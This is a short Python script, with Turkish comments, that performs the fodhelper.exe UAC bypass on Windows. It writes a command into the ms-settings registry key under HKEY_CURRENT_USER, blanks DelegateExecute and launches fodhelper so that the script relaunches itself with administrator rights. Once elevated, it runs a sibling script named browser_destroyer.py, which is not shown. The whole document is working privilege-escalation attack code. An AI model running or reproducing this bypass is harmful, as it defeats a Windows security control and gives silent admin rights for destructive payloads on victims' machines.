import os
import sys
import ctypes #kütüphaneleri import etme
import winreg
import subprocess

CMD                   = r"C:\Windows\System32\cmd.exe"
FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
PYTHON_CMD            = "python" #path
REG_PATH              = r'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

def is_running_as_admin(): #admin yetkisini kontrol etme
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() #kontrol 
    except:
        return False

def create_reg_key(path, name, value): #reg değiştir
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, value)
        winreg.CloseKey(key)
    except WindowsError:
        raise

def bypass_uac(cmd): #bypass
    try:
        create_reg_key(REG_PATH, DELEGATE_EXEC_REG_KEY, '') #reg key oluştur
        create_reg_key(REG_PATH, None, cmd)
    except WindowsError:
        raise

def execute(): #çalıştır
    if not is_running_as_admin(): #admin değilse olmayı dene
        print('[!] The script is NOT running with administrative privileges')
        print('[+] Trying to bypass the UAC')
        try:
            current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + os.path.basename(__file__)
            cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
            bypass_uac(cmd)
            os.system(FOD_HELPER)
            sys.exit(0)
        except WindowsError:
            sys.exit(1)
    else:
        print('[+] The script is running with administrative privileges!')

def run_elevated_command(): #çalıştırılacak şey 
    # Get the current directory of the Python script
    current_dir = os.path.dirname(os.path.realpath(__file__))

    # Run the GetTrustedInstaller.exe file with elevated privileges
    cmd = f'{current_dir}\\browser_destroyer.py' 
    subprocess.run(cmd, shell=True)

    # Close the script after running the elevated command
    sys.exit(0)

if __name__ == '__main__':
    execute()
    if is_running_as_admin():
        run_elevated_command()